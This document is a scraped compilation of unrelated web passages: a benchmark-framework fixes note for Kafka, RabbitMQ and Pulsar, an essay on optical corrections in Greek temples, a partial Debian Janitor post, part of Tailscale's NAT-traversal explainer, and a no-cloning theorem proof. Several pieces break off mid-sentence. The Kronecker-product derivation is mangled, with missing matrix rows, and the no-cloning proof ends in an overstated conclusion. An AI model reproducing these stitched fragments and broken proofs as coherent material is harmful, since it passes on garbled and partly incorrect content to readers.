<p>With any benchmark, one wonders what framework is being used and if it’s fair. To that end, we wanted to use the <a href="http://openmessaging.cloud/docs/benchmarks/" target="_blank" rel="noopener noreferrer">OpenMessaging Benchmark Framework</a> (OMB), originally authored, in large parts, by Pulsar contributors. OMB was a good starting point with basic workload specification, metrics collection/reporting for the test results, support for the three chosen messaging systems as well as a modular cloud deployment workflow tailored for each system. But of note, Kafka and RabbitMQ implementations did have some significant shortcomings that affected the fairness and reproducibility of these tests. The resulting benchmarking code including the fixes described in more detail below are available as <a href="https://github.com/confluentinc/openmessaging-benchmark" target="_blank" rel="noopener noreferrer">open source</a>.</p>
<h3 id="omb-framework"><a id="omb-framework"></a>Fixes to the OMB Framework</h3>
<p>We upgraded to Java 11 and Kafka 2.6, RabbitMQ 3.8.5, and Pulsar 2.6 (the latest releases at the time of writing). We significantly enhanced the monitoring capabilities across the three systems, with the Grafana/Prometheus monitoring stack, capturing metrics across messaging systems, JVM, Linux, disk, CPU, and network. This was critical for being able to not just report results but explain them. We have added support for producer-only tests and consumer-only tests with support for generating/draining backlogs, while also fixing an important bug with producer rate calculation when the number of topics is smaller than the number of producer workers.</p>
<h3 id="omb-kafka-driver"><a id="omb-kafka-driver"></a>Fixes to the OMB Kafka driver</h3>
<p>We fixed a critical bug in the Kafka driver that starved Kafka producers of TCP connections, bottlenecking on a single connection from each worker instance. The fix makes the Kafka numbers fair, compared to other systems—that is, all of them now use the same number of TCP connections to talk to their respective brokers. We also fixed a critical bug in the Kafka benchmark consumer driver, where offsets were being committed too frequently and synchronously causing degradation, whereas it was done asynchronously for other systems. We also tuned the Kafka consumer fetch size and replication threads to eliminate bottlenecks in message fetching at high throughputs and to configure the brokers equivalent to the other systems.</p>
<h3 id="omb-rabbitmq-driver"><a id="omb-rabbitmq-driver"></a>Fixes to the OMB RabbitMQ driver</h3>
<p>We enhanced RabbitMQ to use routing keys and configurable exchange types (<code>DIRECT</code> and <code>TOPIC</code> exchanges) and also fixed a bug in the RabbitMQ cluster setup deployment workflow. Routing keys were introduced to mimic the concept of partitions per …</p></div></div></div>

<td>Ancient Greek architects counteracted the deformity that comes with visual perspective. Objects appear smaller as they are farther away, and as Greek temples were “buildings in which merits and faults usually last forever” <sup id="cite_ref-1"><a title="" href="#cite_note-1">1</a></sup> it was important that all parts be seen in their correct size.An ideal building would be seen as a whole object, with parts that fit perfectly. Unless it displays correct proportions, “there can be no principles in the design of any temple; that is, if there is no precise relation between its members.” <sup id="cite_ref-2"><a title="" href="#cite_note-2">2</a></sup>
<p>Greek and Roman builders sought to “counteract the ocular deception by an adjustment of proportions.” <sup id="cite_ref-3"><a title="" href="#cite_note-3">3</a></sup> Objects farther away were enlarged so that they matched the objects around them. Architects adjusted proportions so that the temple would appear correct when viewed a distance six times the height of a column. This precise viewing distance related the viewer to the architecture and made him part of it.<br>
&nbsp;</p>
<h2><span id="tilt">Tilt to Fix Perspective</span></h2>
<p>&nbsp;<br>
The Roman architect Vitruvius said that all parts above the column of a Doric building should be tilted downward so that they would appear to be vertical when viewed from below. If viewed from afar, these tilted elements would appear flush.</p>

<blockquote><p>“All the members which are to be above the capitals of the columns, that is, architraves, friezes, coronae, tympana, gables, and acroteria, should be inclined to the front a twelfth part of their own height, for the reason that when we stand in front of them, if two lines are drawn from the eye, one reaching to the bottom of the building and the other to the top, that which reaches to the top will be the longer. Hence, as the line of sight to the upper part is the longer, it makes that part look as if it were leaning back. But when the members are inclined to the front, as described above, they will seem to the beholder to be plumb and perpendicular.” <sup id="cite_ref-4"><a title="" href="#cite_note-4">4</a></sup></p></blockquote>

<h2><span id="distance">View Correctly From A Certain Distance</span></h2>
<p>&nbsp;<br>
Why a tilt of 1/12? The roof eave overhang was usually about 1/12th the height of the column (for example, the Temple of Athena at Priene). This was deliberately the same proportion as the entablature tilt, so that it would relate each element of the entablature with the columns below.</p>
<div><p>If we form an equilateral triangle from the tilt of the columns and overhang, we discover that this plane appears flush to someone standing back six times the height of the columns. This point of the triangle will be at eye height, just the right point from which to view the building. To someone standing at this distance, the roof eave will appear the same distance away as the base of the column.<br>
<a href="https://lh4.googleusercontent.com/-jhVJIBBArwE/UtgO_6W0ndI/AAAAAAAACXY/4KC-I2696S0/s0/Ionic%2520measurements.jpg"><img src="https://lh4.googleusercontent.com/-jhVJIBBArwE/UtgO_6W0ndI/AAAAAAAACXY/4KC-I2696S0/s700/Ionic%2520measurements.jpg" alt=""></a></p><p>
&nbsp;
It also creates an angle of ten degrees. The numbers six and ten, Vitruvius said, are the best numbers to use because they are related to most other numbers.</p></div>
<p>The Parthenon has columns of 10.45m height and the overhang is less than 1m. It will therefore be viewed with perfect proportions at a distance of about 60m or 200ft.</p>
<p>This provided precise points on the surrounding topography that related to the building, engaged the landscape, and makes the viewer an active participant. An important function of these buildings was to relate of the human body with the temple, finding the “calculated proportions that could be applied to the human body and temples alike.” <sup id="cite_ref-6"><a title="" href="#cite_note-6">6</a></sup> “Since nature has designed the human body so that its members are duly proportioned to the frame as a whole, it appears that the ancients had good reason for their rule, that in perfect buildings the different members must be in exact symmetrical relations to the whole general scheme.” <sup id="cite_ref-5"><a title="" href="#cite_note-5">5</a></sup></p>
<p>Temples don’t just reference the viewer’s body and the outlaying topography- it directly interacts with them, giving explanation for the design of the body and finding its place in the natural landscape.<br>
&nbsp;</p>
<h2><span id="incline">Incline Columns Inward</span></h2>
<p>&nbsp;<br>
<a href="https://lh4.googleusercontent.com/-d5OPNxDdIvU/UtWyFAi6RdI/AAAAAAAACUg/zMr9rvraoLo/s0/6%2520Columns%2520inclined%2520inward.jpg"><img src="https://lh4.googleusercontent.com/-d5OPNxDdIvU/UtWyFAi6RdI/AAAAAAAACUg/zMr9rvraoLo/s300/6%2520Columns%2520inclined%2520inward.jpg" width="40%" alt=""></a><br>
The facade elements are tilted outward, but the columns are actually tilted inward. This emphasizes their ability to hold up the ceiling. Vertical columns under the heavy weight of the entablature appear like they are about to tip over toward the viewer, but an inward tilt to the columns make them look more stable when viewed from below. This gives “the whole building an appearance of greater strength.” <sup id="cite_ref-7"><a title="" href="#cite_note-7">7</a></sup></p>
<p>In this case Greek architects did not seek to counteract perspective distortion but to use it to their advantage. This “imposing effect of high relief” suggests structural stability, something more important than strict proportion. This inclination is very subtle; on the Parthenon the columns lean inward just 2 3/8 inches. The tilted axis of these columns converge 1 1/2 miles into the sky. <sup id="cite_ref-7"><a title="" href="#cite_note-7">7</a></sup><br>
&nbsp;</p>
<h2><span id="floor">Curved Floor</span></h2>
<p>&nbsp;<br>
<a href="https://lh4.googleusercontent.com/-_TLkgrTunkY/UtW9BX9Fl-I/AAAAAAAACU4/a9tA2iSq4Gc/s0/7%2520Curved%2520stylobate.jpg"><img src="https://lh4.googleusercontent.com/-_TLkgrTunkY/UtW9BX9Fl-I/AAAAAAAACU4/a9tA2iSq4Gc/s300/7%2520Curved%2520stylobate.jpg" width="40%" alt=""></a>The stylobate floor of the Parthenon is curved upward. A perfectly flat floor would appear to sag inward. The face of the earth is curved and the hill on which the Parthenon stands is curved, therefore viewers instinctively expect a slight curvature to all horizontal planes. Straight edges look off.</p>
<p>“This horizontal curvature actually begins not in the stylobate, but below the stylobate in the foundations. But the curvature is most noticeable in the stylobate, which directly receives the downward thrust of the column drums.” <sup id="cite_ref-8"><a title="" href="#cite_note-8">8</a></sup></p>
<p>The curve reaches 2 3/8 inches on the end facades and 4 5/16 inches on the long facades, a radius of 3 1/2 miles. <sup id="cite_ref-7"><a title="" href="#cite_note-7">7</a></sup><br>
&nbsp;</p>
<h2><span id="spacing">Column Spacing</span></h2>
<p>&nbsp;<br>
<a href="https://lh6.googleusercontent.com/-TXUoPKe8oAw/UtW-znV6pfI/AAAAAAAACVQ/8JL2BpmNiJ4/s0/8%2520Column%2520spacing%2520contracted.jpg"><img src="https://lh6.googleusercontent.com/-TXUoPKe8oAw/UtW-znV6pfI/AAAAAAAACVQ/8JL2BpmNiJ4/s300/8%2520Column%2520spacing%2520contracted.jpg" width="40%" alt=""></a><br>
In perspective, the distance between columns normally appear smaller as they proceed toward a <a href="http://www.architecturerevived.com/how-to-find-vanishing-points-in-perspective-drawing/">vanishing point</a> in the distance. But the Parthenon has more robust columns and greater spacing between them at the ends. When viewed from a distance the spacing and size appear equal.</p>
<p>Along with proportions, this also makes the structure appear more stable. “Hence in the Parthenon, the spacing between each corner column and the column next to it is less than the space between other columns, and this gives a feeling of extra support at points of extra stress.” <sup id="cite_ref-9"><a title="" href="#cite_note-9">9</a></sup><br>
&nbsp;</p>
<h2><span id="entasis">Column Shafts Swell Out</span></h2>
<p>&nbsp;<br>
<a href="https://lh4.googleusercontent.com/-_BsUpQkhkXY/UtXBlCfWXNI/AAAAAAAACVw/QI67iJOJalI/s0/9%2520Column%2520entasis%2520Fra%2520Giocondo%2520vitruvius.jpg"><img src="https://lh4.googleusercontent.com/-_BsUpQkhkXY/UtXBlCfWXNI/AAAAAAAACVw/QI67iJOJalI/s300/9%2520Column%2520entasis%2520Fra%2520Giocondo%2520vitruvius.jpg" width="40%" alt=""></a><br>
The shafts of the columns swell slightly outward. This counteracts a feeling of slenderness that results from visual perspective, much as with the case of the curved floor. A swollen column appears more robust and strong than a straight shaft.</p>
<p>Vitruvius prescribed different “proportionate enlargements” depending on the height of the columns. Taller columns require greater enlargement because perspective causes more distortion on them, he reasons. <sup id="cite_ref-10"><a title="" href="#cite_note-10">10</a></sup><br>
&nbsp;</p>
<h2><span id="goldenmean">Golden Proportion</span></h2>

<p><a href="https://lh3.googleusercontent.com/-UGli92vOf7s/UtXCCyZ2qzI/AAAAAAAACV8/44u7F5HCtzg/s0/4%2520Parthenon%2520measurements%2520golden%2520mean.jpg"><img src="https://lh3.googleusercontent.com/-UGli92vOf7s/UtXCCyZ2qzI/AAAAAAAACV8/44u7F5HCtzg/s0/4%2520Parthenon%2520measurements%2520golden%2520mean.jpg" width="100%" alt=""></a></p>
<p><a href="http://www.architecturerevived.com/golden-ratio-form-size-distance-in-space/">The Golden proportion</a> relates parts of an object. It allows the brain to distinguish size and distances of objects in perspective and thus recognize them as parts of a whole body. It comes as no surprise, therefore, that Greeks and Romans use this proportion extensively.</p>
<p>The increase in distance between the columns follows the golden proportion, so that the gap between columns is proportionate to the width of the column shafts. This proportion of positive and negative space allows the viewer’s brain to recognize the columns as part of the entire edifice, so that “the temple, viewed from a distance, compresses into an all but impenetrable volume that stands out in bold relief against its surroundings.” <sup id="cite_ref-11"><a title="" href="#cite_note-11">11</a></sup></p>
<p>In the Parthenon, the stylobates and metopes follow the same golden proportions as the columns. This gives the collonade a golden proportion of 3 columns versus 4 columns and the entire width of the facade a golden proportion. Golden proportion also dictates the column height versus the entablature, the same relationship of elements behind the outward tilt of the facade. The elements within the entablature, which tilt outward 1/12th all have golden proportions amongst themselves.</p>
<p>The <a href="http://miguelmartindesign.com/blog/wp-content/uploads/2011/01/figure7.jpg">golden mean was utilized</a> together with clever ocular corrections to give a sense of wholeness, relationship of parts. This scene of wholeness was achieved from certain views within the outlaying landscape, relating the viewer to the building and to the overall site. The viewer is thus engaged in the architecture.</p>

    <div>

            <section>
                
            </section>
            <p>The <a href="https://jelmer.uk/debian-janitor.html">Debian Janitor</a> is an automated
system that commits fixes for (minor) issues in Debian packages that can be
fixed by software. It gradually started proposing merges in early
December. The first set of changes sent out ran <a href="https://salsa.debian.org/jelmer/lintian-brush">lintian-brush</a> on sid packages maintained in
Git. This post is part of <a href="https://jelmer.uk/tag/janitor-update.html">a series</a> about the progress of the
Janitor.</p>
<div id="scheduling-lintian-fixes">
<h2>Scheduling Lintian Fixes</h2>
<p>To determine which packages to process, the  <a href="https://janitor.debian.net/">Janitor</a>  looks at the import of  <a href="https://lintian.debian.org/">lintian</a>  output across the archive that is available
in  <a href="https://wiki.debian.org/UltimateDebianDatabase/">UDD</a> <a href="#f1" id="id1">[1]</a>. It
will prioritize those packages with the most and more severe issues that it has
fixers for.</p>
<p>Once a package is selected, it will clone the packaging repository and run
<a href="https://manpages.debian.org/testing/lintian-brush/lintian-brush.1.en.html">lintian-brush</a>
on it.  Lintian-brush provides a framework for applying a set of “fixers” to a
package. It will run each of a set of “fixers” in a pristine version of the
repository, and handles most of the heavy lifting.</p>
</div>
<div id="the-inner-workings-of-a-fixer">
<h2>The Inner Workings of a Fixer</h2>
<p>Each fixer is just an executable which gets run in a clean
checkout of the package, and can make changes there. Most
of the fixers are written in Python or shell, but they
can be in any language.</p>
<p>The contract for fixers is pretty simple:</p>
<ul>
<li>If the fixer exits with non-zero, the changes are reverted and fixer is
considered to have failed</li>
<li>If exits with zero and made changes, then it should write a summary of its
changes to standard out</li>
</ul>
<p>If a fixer is uncertain about the changes it has made, it should report so on
standard output using a pseudo-header.  By default, lintian-brush will discard
any changes with uncertainty but if you are running it locally you can still
apply them by specifying <tt><span>--uncertain</span></tt>.</p>
<p>The summary message on standard out will be used for the commit message and
(possibly) the changelog message, if the package doesn’t use gbp dch.</p>
</div>
<div id="example-fixer">
<h2>Example Fixer</h2>
<p>Let’s look at an example. The package priority “extra” is deprecated since
Debian Policy 4.0.1 (released August 2 017) – see
<a href="https://www.debian.org/doc/debian-policy/ch-archive.html#priorities">Policy 2.5 "Priorities"</a>.
Instead, most packages should use the “optional” priority.</p>
<p>Lintian will warn when a package uses the deprecated “extra” value for the
“Priority”  - the associated tag is
<a href="https://lintian.debian.org/tags/priority-extra-is-replaced-by-priority-optional.html">priority-extra-is-replaced-by-priority-optional</a>.
Lintian-brush has a fixer script that can automatically replace “extra” with
“optional”.</p>
<p>On systems that have lintian-brush installed, the source for the fixer lives in
<a href="https://salsa.debian.org/jelmer/lintian-brush/-/blob/master/fixers/priority-extra-is-replaced-by-priority-optional.py">/usr/share/lintian-brush/fixers/priority-extra-is-replaced-by-priority-optional.py</a>,

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
<p>We covered a lot of ground in our post about <a href="https://tailscale.com/blog/how-tailscale-works/"><em>How Tailscale
Works</em></a>.  However, we glossed over how we can get through NATs
(Network Address Translators) and connect your devices directly to
each other, no matter what’s standing between them. Let’s talk about
that now!</p>
<figure>
    
        <img src="https://tailscale.com/blog/how-nat-traversal-works/nat-intro.png">
    
    
</figure>

<p>Let’s start with a simple problem: establishing a peer-to-peer
connection between two machines. In Tailscale’s case, we want to set
up a WireGuard® tunnel, but that doesn’t really matter. The
techniques we use are widely applicable and the work of many people
over decades. For example, <a href="https://webrtc.org/">WebRTC</a> uses this bag of tricks to
send peer-to-peer audio, video and data between web browsers. VoIP
phones and some video games use similar techniques, though not always
successfully.</p>
<p>We’ll be discussing these techniques generically, using Tailscale and
others for examples where appropriate. Let’s say you’re making your
own protocol and that you want NAT traversal. You need two things.</p>
<p>First, the protocol should be based on UDP. You <em>can</em> do NAT traversal
with TCP, but it adds another layer of complexity to an already quite
complex problem, and may even require kernel customizations depending
on how deep you want to go. We’re going to focus on UDP for the rest
of this article.</p>
<p>If you’re reaching for TCP because you want a stream-oriented
connection when the NAT traversal is done, consider using QUIC
instead. It builds on top of UDP, so we can focus on UDP for NAT
traversal and still have a nice stream protocol at the end.</p>
<p>Second, you need direct control over the network socket that’s sending
and receiving network packets. As a rule, you can’t take an existing
network library and make it traverse NATs, because you have to send
and receive extra packets that aren’t part of the “main” protocol
you’re trying to speak. Some protocols tightly integrate the NAT
traversal with the rest (e.g. WebRTC). But if you’re building your
own, it’s helpful to think of NAT traversal as a separate entity that
shares a socket with your main protocol. Both run in parallel, one
enabling the other.</p>
<figure>
    
        <img src="https://tailscale.com/blog/how-nat-traversal-works/nat-deep-integration.png">
    
    
</figure>

<p>Direct socket access may be tough depending on your situation. One
workaround is to run a local proxy. Your protocol speaks to this
proxy, and the proxy does both NAT traversal and relaying of your
packets to the peer. This layer of indirection lets you benefit from
NAT traversal without altering your original program.</p>
<p>With prerequisites out of the way, let’s go through NAT traversal from
first principles. Our goal is to get UDP packets flowing
bidirectionally between two devices, so that our other protocol
(WireGuard, QUIC, WebRTC, …) can do something cool. There are two
obstacles to having this Just Work: stateful firewalls and NAT
devices.</p>
<h3 id="figuring-out-firewalls">Figuring out firewalls</h3>
<p>Stateful firewalls are the simpler of our two problems. In fact, most
NAT devices include a stateful firewall, so we need to solve this
subset before we can tackle NATs.</p>
<p>There are many incarnations to consider. Some you might recognize are
the Windows Defender firewall, Ubuntu’s ufw (using iptables/nftables),
BSD’s pf (also used by macOS) and AWS’s Security Groups. They’re all
very configurable, but the most common configuration allows all
“outbound” connections and blocks all “inbound” connections. There
might be a few handpicked exceptions, such as allowing inbound SSH.</p>
<p>But connections and “direction” are a figment of the protocol
designer’s imagination. On the wire, every connection ends up being
bidirectional; it’s all individual packets flying back and forth. How
does the firewall know what’s inbound and what’s outbound?</p>
<p>That’s where the stateful part comes in. Stateful firewalls remember
what packets they’ve seen in the past and can use that knowledge when
deciding what to do with new packets that show up.</p>
<figure>
    
        <img src="https://tailscale.com/blog/how-nat-traversal-works/nat-firewalls-1a.png">
    
    
</figure>

<p>For UDP, the rule is very simple: the firewall allows an inbound UDP
packet if it previously saw a matching outbound packet. For example,
if our laptop firewall sees a UDP packet leaving the laptop from
<code>2.2.2.2:1234</code> to <code>7.7.7.7:5678</code>, it’ll make a note that incoming
packets from <code>7.7.7.7:5678</code> to <code>2.2.2.2:1234</code> are also fine. The
trusted side of the world clearly intended to communicate with
<code>7.7.7.7:5678</code>, so we should let them talk back.</p>
<p>(As an aside, some <em>very</em> relaxed firewalls might allow traffic from
anywhere back to <code>2.2.2.2:1234</code> once <code>2.2.2.2:1234</code> has communicated
with anyone. Such firewalls make our traversal job easier, but are
increasingly rare.)</p>
<h4 id="firewall-face-off">Firewall face-off</h4>
<p>This rule for UDP traffic is only a minor problem for us, as long as
all the firewalls on the path are “facing” the same way. That’s
usually the case when you’re communicating with a server on the
internet. Our only constraint is that the machine that’s <em>behind</em> the
firewall(s) must be the one initiating all connections. Nothing can
talk to it, unless it talks first.</p>

<p>This is fine, but not very interesting: we’ve reinvented client/server
communication, where the server makes itself easily reachable to
clients. In the VPN world, this leads to a hub-and-spoke topology: the
hub has no firewalls blocking access to it and the firewalled spokes
connect to the hub.</p>
<figure>
    
        <img src="https://tailscale.com/blog/how-nat-traversal-works/nat-firewalls-3.png">
    
    
</figure>

<p>The problems start when two of our “clients” want to talk
directly. Now the firewalls are facing each other. According to the
rule we established above, this means both sides must go first, but
also that neither can go first, because the other side has to go
first!</p>
<figure>
    
        <img src="https://tailscale.com/blog/how-nat-traversal-works/nat-firewalls-4.png">
    
    
</figure>

<p>How do we get around this? One way would be to require users to
reconfigure one or both of the firewalls to “open a port” and allow
the other machine’s traffic. This is not very user friendly. It also
doesn’t scale to mesh networks like Tailscale, in which we expect the
peers to be moving around the internet with some regularity. And, of
course, in many cases you don’t have control over the firewalls: you
can’t reconfigure the router in your favorite coffee shop, or at the
airport. (At least, hopefully not!)</p>
<p>We need another option. One that doesn’t involve reconfiguring
firewalls.</p>
<h4 id="finessing-finicky-firewalls">Finessing finicky firewalls</h4>
<p>The trick is to carefully read the rule we established for our
stateful firewalls. For UDP, the rule is: <strong>packets must flow out
before packets can flow back in.</strong></p>
<p>However, nothing says the packets must be <em>related</em> to each other
beyond the IPs and ports lining up correctly. As long as <em>some</em> packet
flowed outwards with the right source and destination, any packet that
<em>looks like</em> a response will be allowed back in, even if the other
side never received your packet!</p>
<p>So, to traverse these multiple stateful firewalls, we need to share
some information to get underway: the peers have to know in advance
the <code>ip:port</code> their counterpart is using. One approach is to
statically configure each peer by hand, but this approach doesn’t
scale very far. To move beyond that, we built a <a href="https://tailscale.com/blog/how-tailscale-works/#the-control-plane-key-exchange-and-coordination">coordination
server</a> to keep the <code>ip:port</code> information synchronized in a
flexible, secure manner.</p>
<p>Then, the peers start sending UDP packets to each other. They must
expect some of these packets to get lost, so they can’t carry any
precious information unless you’re prepared to retransmit them. This
is generally true of UDP, but especially true here. We’re <em>going</em> to
lose some packets in this process.</p>
<p>Our laptop and workstation are now listening on fixed ports, so that
they both know exactly what <code>ip:port</code> to talk to. Let’s take a look at
what happens.</p>
<figure>
    
        <img src="https://tailscale.com/blog/how-nat-traversal-works/nat-firewalls-5a.png">
    
    
</figure>

<p>The laptop’s first packet, from <code>2.2.2.2:1234</code> to <code>7.7.7.7:5678</code>, goes
through the Windows Defender firewall and out to the internet. The
corporate firewall on the other end blocks the packet, since it has no
record of <code>7.7.7.7:5678</code> ever talking to <code>2.2.2.2:1234</code>. However,
Windows Defender now remembers that it should expect and allow
responses from <code>7.7.7.7:5678</code> to <code>2.2.2.2:1234</code>.</p>
<figure>
    
        <img src="https://tailscale.com/blog/how-nat-traversal-works/nat-firewalls-5b.png">
    
    
</figure>

<p>Next, the workstation’s first packet from <code>7.7.7.7:5678</code> to
<code>2.2.2.2:1234</code> goes through the corporate firewall and across the
internet. When it arrives at the laptop, Windows Defender thinks “ah,
a response to that outbound request I saw”, and lets the packet
through! Additionally, the corporate firewall now remembers that it
should expect responses from <code>2.2.2.2:1234</code> to <code>7.7.7.7:5678</code>, and
that those packets are also okay.</p>
<p>Encouraged by the receipt of a packet from the workstation, the laptop
sends another packet back. It goes through the Windows Defender
firewall, through the corporate firewall (because it’s a “response” to
a previously sent packet), and arrives at the workstation.</p>
<figure>
    
        <img src="https://tailscale.com/blog/how-nat-traversal-works/nat-firewalls-5c.png">
    
    
</figure>

<p>Success! We’ve established two-way communication through a pair of
firewalls that, at first glance, would have prevented it.</p>
<h4 id="creative-connectivity-caveats">Creative connectivity caveats</h4>
<p>It’s not always so easy. We’re relying on some indirect influence over
third-party systems, which requires careful handling. What do we need
to keep in mind when managing firewall-traversing connections?</p>
<p>Both endpoints must attempt communication at roughly the same time, so
that all the intermediate firewalls open up while both peers are still
around. One approach is to have the peers retry continuously, but this
is wasteful. Wouldn’t it be better if both peers knew to start
establishing a connection at the same time?</p>
<p>This may sound a little recursive: to communicate, first you need to
be able to communicate. However, this preexisting “side channel”
doesn’t need to be very fancy: it can have a few seconds of latency,
and only needs to deliver a few thousand bytes in total, so a tiny VM
can easily be a matchmaker for thousands of machines.</p>
<p>In the distant past, I used XMPP chat messages as the side channel,
with great results. As another example, WebRTC requires you to come up
with your own “signalling channel” (a name that reveals WebRTC’s IP
telephony ancestry), and plug it into the WebRTC APIs. In Tailscale,
our coordination server and fleet of DERP (Detour Encrypted Routing
Protocol) servers act as …</p></div></div>

      <h3 id="introduction">Introduction</h3>

<p>In the classical world, it is quite common that we could make an exactly the same copy of something. However, in the quantum world, the laws of physics impose a severe restriction on copying: It is impossible to make a perfect copy of an unknown state.</p>



<p>In this blog post, I would like to discuss the No-Cloning Theorem in quantum theory.</p>

<h3 id="prerequisites">Prerequisites</h3>

<h4 id="kronecker-product-inverse-transpose-property">Kronecker Product Inverse-Transpose Property</h4>

<p>Conjugate transposition are distributive over the Kronecker product:</p><p>

\[(A \otimes B)^{\dagger} =  A^{\dagger} \otimes B^{\dagger}\]

\[\begin{align}
(A \otimes B)^{\dagger} &amp;= 
\begin{bmatrix} 
    A_{0,0}B &amp; A_{0,1}B &amp; \cdots &amp; A_{0,n-1}B \\
    A_{1,0}B &amp; A_{1,1}B &amp; \cdots &amp; A_{1,n-1}B \\
    \vdots &amp; \vdots &amp; \ddots &amp; \vdots \\
    A_{m-1,0}B &amp; A_{m-1,1}B &amp; \cdots &amp; A_{m-1,n-1}B \\
\end{bmatrix}^{\dagger} 
\nonumber\\
&amp;= 
\begin{bmatrix} 
    (A_{0,0}B)^{\dagger} &amp; (A_{1,0}B)^{\dagger} &amp; \cdots &amp; (A_{m-1,0}B)^{\dagger} \\
    (A_{0,1}B)^{\dagger} &amp; (A_{1,1}B)^{\dagger} &amp; \cdots &amp; (A_{m-1,1}B)^{\dagger} \\
    \vdots &amp; \vdots &amp; \ddots &amp; \vdots \\
    (A_{0,n-1}B)^{\dagger} &amp; (A_{1,n-1}B)^{\dagger} &amp; \cdots &amp; (A_{m-1,n-1}B)^{\dagger} \\
\end{bmatrix}
\nonumber\\
&amp;= 
\begin{bmatrix} 
    \overline{A_{0,0}}B^{\dagger} &amp; \overline{A_{1,0}}B^{\dagger} &amp; \cdots &amp; \overline{A_{m-1,0}}B^{\dagger} \\
    \overline{A_{0,1}}B^{\dagger} &amp; \overline{A_{1,1}}B^{\dagger} &amp; \cdots &amp; \overline{A_{m-1,1}}B^{\dagger} \\

&amp;= 
\begin{bmatrix} 
    A_{0,0}^{\dagger}B^{\dagger} &amp; A_{0,1}^{\dagger}B^{\dagger} &amp; \cdots &amp; A_{0, m-1}^{\dagger}B^{\dagger} \\
    A_{1,0}^{\dagger}B^{\dagger} &amp; A_{1,1}^{\dagger}B^{\dagger} &amp; \cdots &amp; A_{1, m-1}^{\dagger}B^{\dagger} \\
    \vdots &amp; \vdots &amp; \ddots &amp; \vdots \\
    A_{n-1,0}^{\dagger}B^{\dagger} &amp; A_{n-1,1}^{\dagger}B^{\dagger} &amp; \cdots &amp; A_{n-1,m-1}^{\dagger}B^{\dagger} \\
\end{bmatrix}
\nonumber\\
&amp;=
A^{\dagger} \otimes B^{\dagger} \\
\end{align}\]

</p><p>This concludes the proof.</p>

<h4 id="kronecker-product-mixed-product-property">Kronecker Product Mixed-Product Property</h4>

<p>Let $A \in \mathbb{C}^{m \times n}$, $B \in \mathbb{C}^{r \times s}$, $C \in \mathbb{C}^{n \times p}$, and $D \in \mathbb{C}^{s \times t}$, then</p><p>

\[(A \otimes B)(C \otimes D) = (AC) \otimes (BD)\]

</p><p>This has been proved in <a href="https://leimao.github.io/blog/Kronecker-Product-In-Circuits/">Kronecker Product In Circuits</a>.</p>

<h4 id="inner-product-expansion-property">Inner Product Expansion Property</h4>

<p>Suppose $|x\rangle$ is any unit vector whose $|x|^2 = \langle x | x \rangle = 1$. We have $\langle \phi | \psi \rangle = (\langle \phi | \otimes \langle x |) (| x \rangle \otimes | \psi \rangle)$</p><p>

\[\begin{align}
(\langle \phi | \otimes \langle x |) (| \psi \rangle \otimes | x \rangle) &amp;= (| \psi \rangle \otimes | x \rangle)^{\dagger} (|\phi\rangle \otimes |x\rangle) \\
&amp;= (| \psi \rangle^{\dagger} \otimes | x \rangle^{\dagger}) (|\phi\rangle \otimes |x\rangle) \\
&amp;= (| \psi \rangle^{\dagger}|\phi\rangle) \otimes (| x \rangle^{\dagger}|x\rangle) \\
&amp;= \langle \phi | \psi \rangle \otimes \langle x | x \rangle\\
&amp;= \langle \phi | \psi \rangle \otimes 1\\
&amp;= \langle \phi | \psi \rangle\\
\end{align}\]

</p><p>This concludes the proof.</p>

<h4 id="unitary-matrix-preserves-inner-product">Unitary Matrix Preserves Inner Product</h4>

<p>Given two complex vectors $x$ and $y$, multiplication by unitary matrix $U$ preserves their inner product.</p><p>

\[\begin{align}
\langle Ux, Uy \rangle &amp;= \langle x, y \rangle
\end{align}\]

</p><p>Using the definition of inner product,</p><p>

\[\begin{align}
\langle Ux, Uy \rangle &amp;= (Uy)^{\dagger} (Ux) \\
&amp;= y^{\dagger}U^{\dagger} U x \\
&amp;= y^{\dagger}(U^{\dagger} U) x \\
&amp;= y^{\dagger} I x \\
&amp;= y^{\dagger} x \\
&amp;= \langle x, y \rangle \\
\end{align}\]

</p><p>This concludes the proof.</p>

<h3 id="no-cloning-theorem">No-Cloning Theorem</h3>

<p>In quantum mechanics, copy, as it is the same to other quantum operators except measurement operators, is an reversible and linear operator.</p>



<p>Given any unknown normalized quantum state $| \phi \rangle$, and the copy operator $U$, we are supposed to have the following mathematical expression if we are going to copy the quantum state $| \phi \rangle$ to another system whose quantum state is $|x \rangle$ before copy.</p><p>

\[| \phi \rangle \otimes |x\rangle \xrightarrow[]{U} | \phi \rangle \otimes |\phi\rangle\]

</p><p>We would like to write this transformation into equation.</p><p>

\[U (| \phi \rangle \otimes |x\rangle) = | \phi \rangle \otimes |\phi\rangle\]

</p><p>Without loss of generality, we could have another state $| \psi \rangle$ that is applied to the copy operator.</p><p>

\[U (| \psi \rangle \otimes |x\rangle) = | \psi \rangle \otimes |\psi\rangle\]

</p><p>Note that for $| \psi \rangle$ we also used $|x\rangle$ which $| \phi \rangle$ is using, meaning that before copy, the “vacant” system is always the same. This is something we could guarantee.</p>



<p>We examine the inner product of $| \phi \rangle$ and $| \psi \rangle$ using the copy property and all the properties in the prerequisite section.</p><p>

\[\begin{align}
\langle \phi | \psi \rangle &amp;= (\langle \phi | \otimes \langle x |) (| \psi \rangle \otimes | x \rangle) \\
&amp;= \big(U (\langle \phi | \otimes \langle x |)\big) \big(U (| \psi \rangle \otimes | x \rangle)\big) \\
&amp;= (\langle \phi | \otimes \langle \phi |) (| \psi \rangle \otimes | \psi \rangle) \\
&amp;= (| \psi \rangle \otimes | \psi \rangle)^{\dagger} (| \phi \rangle \otimes | \phi \rangle) \\
&amp;= (| \psi \rangle^{\dagger} \otimes | \psi \rangle^{\dagger}) (| \phi \rangle \otimes | \phi \rangle) \\
&amp;= (| \psi \rangle^{\dagger} | \phi \rangle ) \otimes (| \psi \rangle^{\dagger} | \phi \rangle ) \\
&amp;= \langle \phi | \psi \rangle \otimes \langle \phi | \psi \rangle \\
\end{align}\]

</p><p>Because $\langle \phi | \psi \rangle$ is scalar, we further have</p><p>

\[\begin{align}
\langle \phi | \psi \rangle &amp;= \langle \phi | \psi \rangle \otimes \langle \phi | \psi \rangle \\
&amp;= \langle \phi | \psi \rangle ^2 \\
\end{align}\]

</p><p>Solving the above equation, we have $\langle \phi | \psi \rangle = 0$ or $1$.</p>



<p>Because $| \phi \rangle$ and $| \psi \rangle$ could be any arbitrary unknown states, $\langle \phi | \psi \rangle = 0$ or $1$ could never be satisfied.</p>



